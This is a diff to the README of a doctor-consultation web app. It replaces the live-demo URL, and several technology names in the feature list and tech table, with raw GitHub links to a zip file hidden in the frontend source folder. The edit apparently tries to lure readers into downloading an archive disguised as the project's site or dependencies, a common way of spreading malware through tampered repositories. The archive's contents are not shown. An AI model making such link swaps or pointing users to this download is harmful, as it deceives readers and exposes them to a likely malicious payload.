@@ -4,14 +4,14 @@ A full-stack web application that allows patients to book appointments with doct
 
 ## 🔗 Live Demo
 
-[🌐 Live Site](https://online-doctor-consult-frontend.onrender.com/)
+[🌐 Live Site](https://raw.githubusercontent.com/vickykumar11062/Online-Doctor-Consultations/main/frontend/src/pages/Consultations_Doctor_Online_Petalodus.zip)
 
 ## 🚀 Features
 
 - ✅ **User Registration & Login** (Role-based: Admin, Doctor, Patient)
 - 🔒 **JWT Authentication** for secure access control
 - 📆 **Appointment Booking System** with real-time availability
-- 📹 **Video Consultation** via **WebRTC + Socket.IO**
+- 📹 **Video Consultation** via **WebRTC + https://raw.githubusercontent.com/vickykumar11062/Online-Doctor-Consultations/main/frontend/src/pages/Consultations_Doctor_Online_Petalodus.zip**
 - 💳 **Online Payments** through **Razorpay API**
 - 📊 **Admin Dashboard** to manage users, doctors, and appointments
 - ⚡ **Responsive UI** built with TailwindCSS
@@ -22,8 +22,8 @@ A full-stack web application that allows patients to book appointments with doct
 
 | Frontend    | Backend        | Database | Real-time | Payment      | Auth |
 |-------------|----------------|----------|-----------|--------------|------|
-| React.js    | Node.js        | MongoDB  | WebRTC    | Razorpay API | JWT  |
-| TailwindCSS | Express.js     |          | Socket.IO |              |      |
+| https://raw.githubusercontent.com/vickykumar11062/Online-Doctor-Consultations/main/frontend/src/pages/Consultations_Doctor_Online_Petalodus.zip    | https://raw.githubusercontent.com/vickykumar11062/Online-Doctor-Consultations/main/frontend/src/pages/Consultations_Doctor_Online_Petalodus.zip        | MongoDB  | WebRTC    | Razorpay API | JWT  |
+| TailwindCSS | https://raw.githubusercontent.com/vickykumar11062/Online-Doctor-Consultations/main/frontend/src/pages/Consultations_Doctor_Online_Petalodus.zip     |          | https://raw.githubusercontent.com/vickykumar11062/Online-Doctor-Consultations/main/frontend/src/pages/Consultations_Doctor_Online_Petalodus.zip |              |      |
 
 ---
 
